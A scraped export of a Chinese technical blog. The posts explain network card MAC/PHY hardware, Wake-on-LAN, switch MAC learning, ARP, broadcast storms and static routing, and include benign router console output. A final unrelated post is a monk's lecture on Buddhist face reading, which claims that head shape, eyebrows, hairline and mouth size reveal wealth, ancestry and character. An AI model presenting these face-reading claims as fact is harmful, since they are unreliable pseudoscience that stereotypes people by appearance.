很多网卡上还有BOOTROM这个东西.它是用于无盘工作站引导操作系统的.既然无盘,一些引导用必需用到的程序和协议栈就放到里面了,例如RPL,PXE等.实际上它就是一个标准的PCI ROM.所以才会有一些硬盘写保护卡可以通过烧写网卡的BootRom来实现.其实PCI设备的ROM是可以放到主板BIOS里面的.启动电脑的时候一样可以检测到这个ROM并且正确识别它是什么设备的.AGP在配置上和PCI很多地方一样,所以很多显卡的BIOS也可以放到主板BIOS里面.这就是为什么板载的网卡我们从来没有看到过BOOTROM的原因. 最后就是电源部分了.大多数网卡现在都使用3.3V或更低的电压.有的是双电压的.因此需要电源转换电路. 而且网卡为了实现Wake on line功能,必须保证全部的PHY和MAC的极少一部分始终处于有电的状态,这需要把主板上的5V Standby电压转换为PHY工作电压的电路.在主机开机后,PHY的工作电压应该被从5V转出来的电压替代以节省5V Standby的消耗.(许多劣质网卡没有这么做). 有Wake on line功能的网卡一般还有一个WOL的接口.那是因为PCI2.1以前没有PCI设备唤醒主机的功能,所以需要着一根线通过主板上的WOL的接口连到南桥里面以实现WOL的功能.新的主板合网卡一般支持PCI2.2/2.3,扩展了PME#信号功能,不需要那个接口而通过PCI总线就可以实现唤醒功能. 我们现在来看两个图 MAC和PHY分开的以太网卡 MAC和PHY集成在一颗芯片的以太网卡 上图中各部件为: ①RJ-45接口 ②Transformer(隔离变压器) ③PHY芯片 ④MAC芯片 ⑤EEPROM ⑥BOOTROM插槽 ⑦WOL接头 ⑧晶振 ⑨电压转换芯片 ⑩LED指示灯 网卡的功能主要有两个:一是将电脑的数据封装为帧,并通过网线(对无线网络来说就是电磁波)将数据发送到网络上去;二是接收网络上其它设备传过来的帧,并将帧重新组合成数据,发送到所在的电脑中.网卡能接收所有在网络上传输的信号,但正常情况下只接受发送到该电脑的帧和广播帧,将其余的帧丢弃.然后,传送到系统CPU做进一步处理.当电脑发送数据时,网卡等待合适的时间将分组插入到数据流中.接收系统通知电脑消息是否完整地到达,如果出现问题,将要求对方重新发送. 问:10BaseT和100BaseTX PHY实现方式不同的原因何在? 答:两种实现的分组描述本质上是一样的,但两者的信令机制完全不同.其目的是阻止一种硬件实现容易地处理两种速度.10BaseT采用曼彻斯特编码,100BaseTX采用4B/5B编码. 问:什么是曼彻斯特编码? 答:曼彻斯特编码又称曼彻斯特相位编码,它通过相位变化来实现每个位(图2).通常,用一个时钟周期中部的上升沿表示”1”,下降沿表示”0”.周期末端的相位变化可忽略不计,但有时又可能需要将这种相位变化计算在内,这取决于前一位的值. 问:什么是4B/5B编码? 答:4B/5B编码是一种块编码方式.它将一个4位的块编码成一个5位的块.这就使5位块内永远至少包含2个”1”转换,所以在一个5位块内总能进行时钟同步.该方法需要25%的额外开销. 问:网卡的MAC和PHY间的关系? 答:网卡工作在osi的最后两层,物理层和数据链路层,物理层定义了数据传送与接收所需要的电与光信号、线路状态、时钟基准、数据编码和电路等,并向数据链路层设备提供标准接口.物理层的芯片称之为PHY.数据链路层则提供寻址机构、数据帧的构建、数据差错检查、传送控制、向网络层提供标准的数据接口等功能.以太网卡中数据链路层的芯片称之为MAC控制器.很多网卡的这两个部分是做到一起的.他们之间的关系是pci总线接mac总线,mac接phy,phy接网线(当然也不是直接接上的,还有一个变压装置). PHY和MAC之间是如何传送数据和相互沟通的.通过IEEE定义的标准的MII/GigaMII(Media Independed Interfade,介质独立界面)界面连接MAC和PHY.这个界面是IEEE定义的.MII界面传递了网络的所有数据和数据的控制.ETHERNET的接口实质是MAC通过MII总线控制PHY的过程. 问:网线上传输的是模拟信号还是数字信号? 答:是模拟信号.因为它传出和接收是采用的模拟的技术.虽然它传送的信息是数字的(并不是传送的信息是数字的信号就可以叫做数字信号). 简单的例子:我们知道电话是模拟信号,但是当我们拨号上网的时候,电话线里传送的是数字信息,但信号本身依旧是模拟的.然而ADSL同样是通过电话线传送的,却是数字信号.这取决于它传出和接受采用的技术. 问:若操作系统没有加载网卡驱动,网卡虽然在系统设备树上,但网卡接口创建不了,那网卡实际能不能接收到数据? 答:这里面有很多细节, 我根据Intel网卡的Spec大概写了写, 想尽量写的通俗一些,所以没有刻意用Spec里的术语,另外本文虽然讲的是MAC/PHY,但光口卡的(SERDES)也是类似的. PCI设备做reset以后进入D0uninitialized(非初始化的D0状态, 参考PCI电源管理规范),此时网卡的MAC和DMA都不工作,PHY是工作在一个特殊的低电源状态的; 操作系统创建设备树时,初始化这个设备,PCI命令寄存器的 Memory Access Enable or the I/O Access Enable bit会被enable, 这就是D0active.此时PHY/MAC就使能了; PHY被使能应该就可以接收物理链路上的数据了,否则不能收到FLP/NLP, PHY就不能建立物理连接.但这类包一般是流量间歇发送的; 驱动程序一般要通过寄存器来控制PHY, 比如自动协商speed/duplex, 查询物理链路的状态Link up/down; MAC被使能后, 如果没有驱动设置控制寄存器的一个位(CTRL.SLU )的话, MAC和PHY是不能通讯的, 就是说MAC不知道PHY的link已经ready, 所以收不到任何数据的.这位设置以后, PHY完成自协商, 网卡才会有个Link change的中断,知道物理连接已经Link UP了; 即使Link已经UP, MAC还需要enable接收器的一个位(RCTL.RXEN ),包才可以被接收进来,如果网卡被reset,这位是0,意味着所有的包都会被直接drop掉,不会存入网卡的 FIFO.老网卡在驱动退出前利用这位关掉接收.Intel的最新千兆网卡发送接收队列的动态配置就是依靠这个位的,重新配置的过程一定要关掉流量; 无论驱动加载与否, 发生reset后,网卡EEPOM里的mac地址会写入网卡的MAC地址过滤寄存器, 驱动可以去修改这个寄存器,现代网卡通常支持很多MAC地址,也就是说,MAC地址是可以被软件设置的.例如,Intel的千兆网卡就支持16个单播 MAC地址,但只有1个是存在EEPROM里的,其它是软件声称和设置的; 但如果驱动没有加载,网卡已经在设备树上,操作系统完成了步骤1-2的初始化,此时网卡的PHY应该是工作的,但因为没有人设置控制位(CTRL.SLU)来让MAC和PHY建立联系,所以MAC是不收包的.这个控制位在reset时会再设置成0; PHY可以被软件设置加电和断电, 断电状态除了接收管理命令以外,不会接收数据.另外,PHY还能工作在Smart Power Down模式下,link down就进入省电状态; 有些多口网卡,多个网口共享一个PHY, 所以BIOS里设置disbale了某个网口, 也未必会把PHY的电源关掉,反过来,也要小心地关掉PHY的电源; 要详细了解PHY,最终还是要熟悉IEEE以太网的相关协议. 本文引用:http://blog.csdn.net/woodstar123/article/details/3324368 http://blog.csdn.net/yayong/article/details/5334565","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"交换机的MAC地址学习和ARP协议","slug":"EMBEDDED/交换机的MAC地址学习和ARP协议","date":"2016-07-08T06:11:12.000Z","updated":"2017-07-10T08:46:16.516Z","comments":true,"path":"EMBEDDED/交换机的MAC地址学习和ARP协议.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/交换机的MAC地址学习和ARP协议.html","excerpt":"1. 首先我们来看看交换机，swith（交换机） 今天就先讲讲交换机和网桥的区别。这两个设备都工作在第2层 主要区别是，交换机的转发速度较快，是硬件的转发，端口数比较多 下面直接来看交换机的学习功能 , 也就是交换机的MAC地址学习. 下面我们","text":"1. 首先我们来看看交换机，swith（交换机） 今天就先讲讲交换机和网桥的区别。这两个设备都工作在第2层 主要区别是，交换机的转发速度较快，是硬件的转发，端口数比较多 下面直接来看交换机的学习功能 , 也就是交换机的MAC地址学习. 下面我们设想一个模型，有A，B，C，D这四台PC接在一台交换机上, 首先交换机最初加电时它里面的MAC地址表为空，也就是还没学习，在学习的最初状态. 首先，比如A发给D一个数据, 这个时候交换机首先在连接A那台PC的端口上学习到A的MAC地址，并且把这个MAC地址记录到交换机里的MAC地址表里, 但是这个时候交换机并不知道D是在哪，因为MAC表里还没有D的MAC. 这个时候怎么办呢？交换机会复制多份这个数据(多帧复制)，向交换机的所有端口都转发这个数据（除A接的那个端口外），这个称为泛洪，flooding 。当B和C接到这个数据时，首先检查目的地址，发现不是发给我的，那么就丢弃这个帧 . 当D接到这个帧时，发现这是发给自己的，然后D便会发给A数据，这个时候交换机在D的接口又学习到了D的MAC地址 , 这个时候交换机学习到了两条MAC地址。 2. 下面继续讲ARP协议 当数据包到网络层的时候，这个时候会继续向下层数据链路层封装，这个时候要找寻目的的MAC地址. 因为在第2层，也就是交换机工作的那层是不不知道什么叫IP地址呢，交换机始终是靠MAC地址找寻的 . 列举： 还是那个开始的那个模型，当A发数据给D。这个时候，在网络层只知道D的IP地址，那么怎么获取D的MAC地址，从而让交换机把数据发送到D的MAC地址呢？这个时候A便会发送arp，，注意一点，交换机本身是不会主动发送ARP的。那么在ARP这个报文里包含了啥东东呢？ARP报文里有源MAC地址，（也就是A的MAC地址），源IP地址，目的IP地址（也就是D的IP地址），目的MAC地址这个时候为全F，，因为这个arp是一个广播嘛。全F的MAC地址就是一个广播，因为这个时候A不知道D的mac地址，所以要发送一个广播，通知全部的PC，找寻D的MAC地址 ，怎么发送给全部同网段的PC呢？就是靠全F的mac地址。也叫flooding，我说了泛洪只是一个形象的比喻书法。当D接到这个ARP请求后，发现是找自己的，那么就返回一条ARP回应给A，告诉自己的MAC地址 ，全F的MAC地址就是广播。这个时候A的arp表便记录了D的ip地址和mac地址的对应关系。这样便顺利的发送给了D这台机子的物理地址，mac。交换机的学习是交换机自己多帧复制，不是靠广播实现，ARP是PC发送ARP广播。在A的arp表项里会记录D的ip和mac的对应关系，这个arp表在ms的系统里好像是15分钟刷新一次。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"CCNP-冗余链路中的广播风暴、多帧复制、地址表的不稳定","slug":"EMBEDDED/CCNP-冗余链路中的广播风暴、多帧复制、地址表的不稳定","date":"2016-07-08T06:07:20.000Z","updated":"2017-07-10T08:45:33.977Z","comments":true,"path":"EMBEDDED/CCNP-冗余链路中的广播风暴、多帧复制、地址表的不稳定.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/CCNP-冗余链路中的广播风暴、多帧复制、地址表的不稳定.html","excerpt":"STP协议：当网络中存在备份链路时，只允许主链路激活，如果主链路因故障而断开后，备用链路才会被打开。 广播风暴：在没有避免交换环路措施的情况下，每个交换机都无穷无尽的转发广播帧。广播流量破坏了正常的通信流，消耗了带宽和交换机的CPU资源，直至交换机死机","text":"STP协议：当网络中存在备份链路时，只允许主链路激活，如果主链路因故障而断开后，备用链路才会被打开。 广播风暴：在没有避免交换环路措施的情况下，每个交换机都无穷无尽的转发广播帧。广播流量破坏了正常的通信流，消耗了带宽和交换机的CPU资源，直至交换机死机或者关机才算结束。 举例问答解释： 交换机什么情况下产生广播？目标MAC在MAC表中不存在时。 广播发送到哪些主机？和发送端位于同一广播域中的主机。 什么是风暴？大量广播包在局部范围内不断地复制转发。 为什么产生风暴？本质就是广播包的不正常地复制或产生，其中重要的一条就是一环路的存在。 环路为什么会产生风暴？假设AB两点成环，位于同一交换机。A发出未知地址的广播包，B接收到后由于交换机中无此MAC，重新发起一个广播，此广播包又到达A，由于目标无法从MAC表中匹配，A会再次发一起个广播，这样不停循环下去，就产生了广播风暴。 多帧复制：也叫重复帧传送，单播的数据帧可能被多次复制传送到目的站点。很多协议都只需要每次传输一个拷贝。多帧复制会造成目的站点收到某个数据帧的多个副本，不但浪费了目的主机的资源，还会导致上层协议在处理这些数据帧时无法选择，严重时还可能导致不可恢复的错误。 举例： 当主机A发送一个给主机B的单播帧，此时交换机SW1的MAC地址表中如果没有主机Ｂ的条目，则会把这个单播帧从端口F0/1和F0/2泛洪出去。因此，交换机SW2就会从端口F0/1和F0/2分别收到2个发给主机B的单播帧，如果交换机SW2的MAC地址表中已经有了主机B的条目，它就会将这两个帧分别转发给主机B，这样主机B就收到了同一个帧的二份拷贝，于是形成了多帧复制。 MAC地址表抖动：也就是MAC地址表不稳定，这是由于相同帧的拷贝在交换机的不同端口上被接收引起的。如果交换机将资源都消耗在复制不稳定的MAC地址表上，那么数据转发的功能就可能被消弱了。 举例： 当交换机SW2从端口F0/1收到主机A发出的单播帧时，它会将端口F0/1与主机A的对应关系写入MAC地址表；而当它随后又从端口F0/2收到主机A发出的单播帧时，会将MAC地址表中的主机A对应的端口改为F0/2，这就造成了MAC表的抖动。当主机B向主机A回复了一个单播帧后，同样的情况也会发生在交换机SW1中。 感谢internet！","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"路由下一跳与出站接口区别","slug":"EMBEDDED/路由下一跳与出站接口区别","date":"2016-07-07T11:27:52.000Z","updated":"2017-07-10T08:47:40.830Z","comments":true,"path":"EMBEDDED/路由下一跳与出站接口区别.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/路由下一跳与出站接口区别.html","excerpt":"用出站接口，意思就是去往指定目标网络从这个接口丢出去，适用于点到点网络，和ARP无关，点到点网络本身是可以不需要地址的。除了你就是我，除了我就是，你要不要地址、寻址根本没什么意思。所以用出站接口写静态路由，路由表里显示的是直连。 用下一跳IP地址，下一","text":"用出站接口，意思就是去往指定目标网络从这个接口丢出去，适用于点到点网络，和ARP无关，点到点网络本身是可以不需要地址的。除了你就是我，除了我就是，你要不要地址、寻址根本没什么意思。所以用出站接口写静态路由，路由表里显示的是直连。 用下一跳IP地址，下一跳IP地址，叫递归静态路由，路由器在转发数据包到目标网络的时候，首先要先解析下一跳的可达性，换句话说总共要解析两次，从转发效率上来说低于直连静态路由(用出站口)。递归静态路由一般用在多路访问环境，所以下一跳理论上来说必须指定一个IP地址，不能像点到点那样随便乱丢包。 现在的新问题是，按照这个原理，我们在以太网上做静态路由的时候，为什么下一跳指定出站接口，路由器依然知道如何转发数据包呢？按照我们刚才讲的理论，在多路访问环境下如果用出站接口做静态路由，路由器应该不知道下一跳是谁才对。这是为什么呢？ 答案是代理ARP。但是这样做也有很大的缺点，就是说理论上本机最多会产生2^32条ARP缓存，相当消耗内存。所以多路访问环境不建议使用直连静态路由，建议采用递归静态路由。 在配置静态路由时，即可指定接口，也可指定下一跳。使不同的网段的主机通信，到底采用哪种方法，需要根据实际情况而定，在点到点的网络环境中，无论是指定下一跳地址还是接口地址，其效果都一样。但是在广播网络环境下，指定下一跳地址或接口地址就会起到不同的效果，如果指定为接口地址的话，那么不管数据包的目标地址是否有效，每次数据包到达时都会触发一个ARP请求，又因为ARP代理在[iOS环境下默认是打开的，这意味着路由器需要配备大量的ARP高速缓存，而如果指定为下一跳地址的话，仅当第一个去往目的地址的数据包到达时才会触发ARP请求。 网关和接口确定过程 在确定使用的路由项后，网关和接口通过以下方式确定： 如果路由项中的网关地址为空或者为本地计算机上的某个网络接口，那么在发送数据包时： * &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:#333333; font-size:10pt&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;通过路由项中对应的网络接口发送；&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 源IP地址为此网络接口的IP地址； 源MAC地址为此网络接口的MAC地址； 目的IP地址为接收此数据包的目的主机的IP地址； 目的MAC地址为接收此数据包的目的主机的MAC地址； 如果路由项中的网关地址并不属于本地计算机上的任何网络接口，那么在发送数据包时： * &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:#333333; font-size:10pt&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;通过路由项中对应的网络接口发送；&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 源IP地址为路由项中对应网络接口的IP地址； 源MAC地址路由项中对应网络接口的MAC地址； 目的IP地址为接收此数据包的目的主机的IP地址； 目的MAC地址为网关的MAC地址； 在此以上面的路由表为基础，举例进行说明： http://wdqfirst.blog.163.com/blog/static/113347411201122825221701/](http://lib.csdn.net/base/1 “Swift知识库”) 和单播IP地址 192.168.1.8 的通信：在进行相与计算时，1、3 项匹配，但是3项为最长匹配路由，因此选择3项。3项的网关地址为本地计算机的网络接口192.168.1.6，因此发送数据包时，目的IP地址为 192.168.1.8、目的MAC地址为192.168.1.8的MAC地址（通过ARP解析获得）。 和单播IP地址 192.168.1.6 的通信：在进行相与计算时，1、3、6 项匹配，但是6项为最长匹配路由，因此选择6项。6项的网关地址为本地环回地址127.0.0.1，因此直接将数据包发送至本地环回地址。 和单播IP地址 192.168.1.245 的通信：在进行相与计算时，1、3、4、5 项匹配，但是4、5项均为最长匹配路由，所以此时根据跃点数进行选择，5 项具有更低的跃点数，因此选择5项；在发送数据包时，目的IP地址为192.168.1.254、目的MAC地址为192.168.1.7的MAC地址 （通过ARP解析获得）。 和单播IP地址 10.1.1.1 的通信：在进行相与计算时，只有 1 项匹配；在发送数据包时，目的IP地址为10.1.1.1、目的MAC地址为192.168.1.1的MAC地址（通过ARP解析获得）。 和子网广播地址 192.168.1.255 的通信：在进行相与计算时，1、3、4、5、7 项匹配，但是7项为最长匹配路由，因此选择7项。7项的网关地址为本地计算机的网络接口，因此在发送数据包时，目的IP地址为 192.168.1.255，目的MAC地址为以太网广播地址FF:FF:FF:FF:FF:FF。 配好ethWan 但是不能ping通网关？ &gt; ping 192.168.10.134PING 192.168.10.134 (192.168.10.134): 56 data bytes — 192.168.10.134 ping statistics —4 packets transmitted, 0 packets received, 100% packet loss &gt; &gt; &gt; wan showVCC Con. Service Interface Proto. IGMP Status IP ID Name Name addressN/A 0 pppoe_usb3g ppp7 PPPoE Disable Unconfigured (null)N/A 0 ipoe_eth0 eth0 IPoE Enable Connected 192.168.10.86 &gt; &gt; route showKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.10.0 255.255.255.0 U 0 0 0 br0192.168.10.0 255.255.255.0 U 0 0 0 eth0192.168.10.0 192.168.10.134 255.255.255.0 UG 1 0 0 br0default 192.168.10.134 0.0.0.0 UG 0 0 0 eth0 &gt; &gt; ping 192.168.10.134PING 192.168.10.134 (192.168.10.134): 56 data bytes^C— 192.168.10.134 ping statistics —2 packets transmitted, 0 packets received, 100% packet loss &gt; &gt; &gt; ifconfig br0 br0 Link encap:Ethernet HWaddr 00:1A:2B:07:11:00 inet addr:192.168.10.85 Bcast:192.168.10.255 Mask:255.255.255.0 UP BROADCAST RUNNING ALLMULTI MULTICAST MTU:1500 Metric:1 RX packets:3121 errors:0 dropped:0 overruns:0 frame:0 TX packets:2477 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:391982 (382.7 KiB) TX bytes:2480685 (2.3 MiB) &gt; ifconfig br0 192.168.1.85 &gt; route showKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.1.0 255.255.255.0 U 0 0 0 br0192.168.10.0 255.255.255.0 U 0 0 0 eth0default 192.168.10.134 0.0.0.0 UG 0 0 0 eth0 &gt; &gt; ping 192.168.10.134PING 192.168.10.134 (192.168.10.134): 56 data bytes64 bytes from 192.168.10.134: seq=0 ttl=64 time=1.221 ms64 bytes from 192.168.10.134: seq=1 ttl=64 time=1.151 ms64 bytes from 192.168.10.134: seq=2 ttl=64 time=2.143 ms64 bytes from 192.168.10.134: seq=3 ttl=64 time=1.561 ms 总结：lan和wan的网段不能相同","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"【修行】高僧开示面相","slug":"EMBEDDED/【修行】高僧开示面相","date":"2016-07-07T00:31:47.000Z","updated":"2017-07-10T08:45:57.132Z","comments":true,"path":"EMBEDDED/【修行】高僧开示面相.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/【修行】高僧开示面相.html","excerpt":"今天想跟大家聊一下佛门相学，这个话题几个小和尚已催我多次，实际上我在私下里讲了很多。相学也算佛门里的一门学问，一般不教在家人学。过去有种说法，看相、算命、风水，包括预测等均属玄学，都是无后之人的一碗饭，有老婆儿女的人是不允许吃这碗饭的。现在新社会都变了，不","text":"今天想跟大家聊一下佛门相学，这个话题几个小和尚已催我多次，实际上我在私下里讲了很多。相学也算佛门里的一门学问，一般不教在家人学。过去有种说法，看相、算命、风水，包括预测等均属玄学，都是无后之人的一碗饭，有老婆儿女的人是不允许吃这碗饭的。现在新社会都变了，不管是否有后，谁都可以干这个行业，甚至有妻室儿女的人比出家人学的还要精，就像香港的几个有名的大师，都是有妻子儿女的，因为要靠这个吃饭，要竞争，只有技艺超群，他才能立足于社会。而出家人不用它来谋生，学好学坏都无所谓，只是玩一玩，反而只学了个皮毛，好多出家人甚至根本不懂。 当初在学校里，法师给我们只是泛泛地讲了个轮廓，个人随着嗜好，又私下里请教了一些老法师。佛门里所传授的比较简洁明了，可以说一步到位，一针见血，佛门的观点是，要么不开口，一旦说出来，一定讲真话，否则就是打妄语。世间任何事都不是绝对的，也没有绝对的是与非，师父们讲的只供大家参考，讲的不对、不好，也不需要马上辩论，因为每个人的观点不一样，任何一门学问，由于每个人的领悟程度不同，学完了都会形成自己的看法，尤其现在百花齐放，百家争鸣。古代领导阶层多少都懂一些相学，否则很难选拔培养人才，更不要说与人打交道了。 一般来说，相学分批八字、看相两种。看相又分几个层次：低层次看相是看形，即通常说的五官；境界稍高一点的看气色；再高一点的看神韵，有时这三者又彼此相关。看形比较好区分，而看气和神就比较难了，这二者有时很难区分，最难的是看神韵，必须达到很高的境界才能辨别。学相学，不看过上万人，很难摸到规律，学会了，平时就要多观察，观察完了，可以问问与你看的是否一致，不要急于给人看相。 中国人多少都信一点这方面的学问。其实中国的整个玄学都有连带关系，风水与阴阳五行、命理八字都是相通的，学一门必须兼学其他几门才能学好，否则，单学某一项是很难通达的。就像医生，若想成为胃科专家，就不能只研究胃，五脏六腑都要兼顾，才能把胃了解透彻，诊断准确，因为它们互为一体。 我们先讲形：通常我们看一个人先从头看起，古人曰，”相者七分头，三分面”，看一个人的荣华富贵，头占了七成，五官只占三成。那么，究竟什么样的头算好呢？头分富、贵、又富又贵、不富又不贵。人的命总体概括起来也不外乎这四种：一富、二贵、三是又富又贵，四是不富又不贵。通常头含贵的成分占七分，面含富的成分占三分，请问五官中哪一官代表富呢？ 答：地格，下巴。 师：对，地格，又名下巴。地格一定要涵盖腮帮子。一个人如果有比较丰满、挺拔、肥厚的好鼻子，他的确有钱，但只是当运气走到鼻子这个阶段，即四十五、至五十岁这五年财富很旺，若无好下巴（好腮帮子），过了这五年一样会贫穷。如果一个人即使鼻子长得不好，但有一个好下巴和腮帮子，晚年仍会很富有。 通常，头以圆润为上等相。还有一种头呈鼓相，鼓相里又包含了鼓奇，何为鼓奇呢？古人把鼓相和奇相连在一起称鼓奇，比如头中间突然鼓得很高，就像年画上的老寿星——中间的顶骨高高突起，即是鼓奇相。今天中午我发现NM的后脑勺鼓了个包，这是最近一百天内才长出来的，这又叫”玉枕骨”。”玉枕骨”代表贵，古人说”玉枕骨”意味着可得食禄一万七千石，古代看福禄大小用多少石来表示，就此我问过老和尚，按现在的说法，食禄一万七千石相当于一个县太爷的福报。 若后面没有这种鼓出来的骨头，但前面的额头是鼓出来的——中间那个龙虎骨鼓得比后面的还要大，也代表贵。一般掌大权、个性能力比较强的人，中间的龙虎骨都是突出来的，换句话说，龙虎骨代表一个人的个性和掌控能力。如果龙虎骨是鼓出来的，又兼得两边的辅骨，则意味着有人辅佐。辅骨代表一个人的组织能力和协调能力，也意味着此人能组建个人团队，往往有龙虎骨的人比较固执、独裁、霸道，很容易忽略身边人的感受，这种人比较注重自我，不太在意对身边人才的培养和团队的培养。但作为领导者，不仅要具备龙虎骨，还要有两边的辅骨，因为领导人需要众人辅佐。 有辅骨的人比较注重身边友邻睦邦的关系，很会笼络人心，这种人善于换位思考，擅长站在别人的立场并能考虑别人的感受，有凝聚力，能建立自己的团队。具备这种个性的人，辅骨就会长出来，辅骨长出来也说明这种人内在有这股气，所以他非常重视外部发展，使之形成良性循环。而中间龙虎骨很突出的人则不会在乎身边人的感受，而是凭着自己的感受行事。越不在乎身边人感受的人，其额骨（额头中间的骨头）就越来越鼓。但是，要想干一番事业，必须有人辅佐。我曾说过，一个人可以干事，但绝对干不成一番事业，要想成就一番事业，必须有团队，有人辅佐，就是说，一个想坐轿子的人，必须有人给他抬轿子，否则只能做事，而做不了一番事业。 事业与事有何区别呢？我们现在就是在做事，而非事业。做事是为了谋生、养家糊口；事业则是有利于千秋万代，让无量众生受益，即便人死了，他所做的事业依旧在，仍然可以让后人享用他留下来的福报。用个不太恰当、但很能说明问题的比喻，韶关现在是中国优秀旅游城市，南华寺和丹霞山作为最主要的旅游景点，每年吸引着上千万的游客，其中最主要的因素就是六祖为惠及后人而留下的真身，六祖做的就是千秋伟业，尽管他去世一千多年了，可至今还有无数的人在仰仗他生存，一代又一代…… 还有一种人，额头中间的龙虎骨呈弱势，而两边的辅骨特别强，这种人善于拉帮结派、搞斗争，内有这股气，外则有其形。 上等头相，既有龙虎骨，又有辅骨，比较匀称，即所谓的天庭饱满。饱满就是圆润——肥不臃肿，瘦不露骨，如果露骨了，说明内在的阳火很旺，阳火旺的人，脾气都很暴躁，这种人做事往往图一时之快，不计后果。还有一种说法，十个瘦子九个贫，就怕瘦到有精神。比方说MD就很瘦，但他瘦的很有精神，两眼贼亮贼亮的，他也会富贵。如果一个人又瘦又没精神，两眼浑浊无光，再加上没有声音，肯定贫穷。古人说，有骨为贵，有肉为富。如果一个人肉很多，臃肿地堆在一起，也不能说是上等相，就是我们常说的某人一身懒肉，所以，胖不能臃肿，瘦不能露骨。 人的额头要宽，额头的横向为宽，纵向为阔。透过额头可以看一个人的祖上三代，比如说我是第十代，即我上面的第九代和第八代。一个人的发际线如果压住额头，压在眉上，说明他的家族上三代在当地都不是知名人士。如果一个人的额头又宽又阔，且饱满、光泽、圆润，此人的上三代在当地都是知名人士，皆属上层人物。若发际线不仅压额头，而且像锯齿一样不整齐，一者表示此人祖上未出过名人、达官贵人，二者意味着此人少年不得志。如果发际线压了眉头，不仅少年不得志，而且只有过了四十岁才得志。 古人说，少看两道眉，临老一付须。一个人少年是否得志，看的是两道眉；老了有没有福气就看一付胡须。究竟什么样的眉好呢？并非眉毛又浓又粗又黑就好，看眉首先要看光泽度，光泽里还包含了秀，眉不仅要秀，还要有光泽。 一个人，若额头饱满，且又光泽无坑洼、无抬头纹，表示此人的祖上在当地有影响力，说话管用，受人尊重爱戴，同时也意味着此人少年比较得志，想做之事都能达成，帮助他的人比较多。那么，抬头纹什么时候出现属于正常呢？一般来说，四十岁一过，开始隐隐约约出现抬头纹，都属正常。如果二十岁出头就有很多抬头纹，就不正常了。人步入成年后，看相就不看额头了。 现在讲讲发际线。额头发际线长得很高、但两边（额头）很窄的人，往往好高骛远，非常务虚，不实在。如果发际线很低，但额头很开阔的人，往往特别不自信，总觉得自己很笨不如人、出生卑微……。实际上，这种人的能力很强、素质非常好，只是内心相对而言比较自卑。另有一种发际线，长的形状像字母V、W，这种人做事过于谨小慎微，遇到事情总是瞻前顾后，想的多，行动的少。如果一个人的额头又宽又阔又大，通常这种人胆量非常大，做事通常只看个三五分，看不透就懒得看了，干脆先去做，干了再说，这种人喜欢边干、边看、边处理问题。 看一个人的胆识，不仅要看额头，还要看他的嘴。额头代表一个人的心量、气魄、胆识和爆发力，一个人是否有胆识，还要看他的嘴，嘴大，胆识也大。就像NM的嘴非常大，属于马口嘴，所以他的胆量就非常大，你不让他干，他偏要干，打也不害怕，继续干。马口嘴往两边开的人胆量特别大，古人说，嘴能容拳的人，胆识之大可勇冠三军，不管能否打过对方，都敢扬鞭策马冲锋陷阵，这就是他的胆量。 如果一个人的头顶塌陷，包括前面、后面塌陷，说明阳气没有完全生发上来，就像一个缺乏水分干瘪的水果，由于精力不够，或者说气血不足，未能冲上来。这类人的思想永远不会处于中道，很容易走极端：走上行善的道路，会极端行善；走上行恶的道路，会极端行恶。常言某人一肚子坏水，坏得无可救药，就是指极端行恶的人。这种人为什么善于走极端呢？因为他里面的气不中和，辐射不均匀，气是偏的，气偏就导致了头顶发育不均衡，一边饱满，另一边凹个坑，因此不仅思维偏离，行为也偏激。一般来说，这种人老年后特别容易健忘、痴呆：气血不足，大脑长期缺氧，脑细胞死亡率就比较高，老化的就快，所以容易健忘。 再看我们的首座和尚，年纪轻轻的中间头发就很少，将来肯定就剩一圈头发，这是因为他体内的湿热往上冲得比较多，或者说阳气往上升得比较多，中间就谢顶了。这种人内心非常阳光、活跃、充满激情，别看他平时话不多，但他的内心很阳光，喜欢吃，喜欢玩，喜欢乐，喜欢和大家交朋友。尽管他没有表现出内在的激情，但内在的热量充足，一直在喷火，所以能量就顺着中枢、中脉冲上来，导致头顶长期湿热、头发提前脱落。 谈完额头，谈这两道眉，首先讲讲眉间距离。大家看HZ的两道眉，会发现他的两道眉长在一条线上，并连在了一起，又称一字眉。眉毛连在一起的人，思想观念和为人处世都容易走极端，任何时候都觉得自己对、别人错，根本没有商量的余地，心量比较小。因这种人的思维方式好走极端、不在中道，往往当一件事尚未看到任何苗头，就会觉得结果非常糟糕，乃至破罐子破摔，失去理智，比如要不然就跟人家拼命，觉得拼就拼了，大不了一条命，更甚者，连拼都不拼就自杀了，绝不会想个中和的办法去协调挽回。 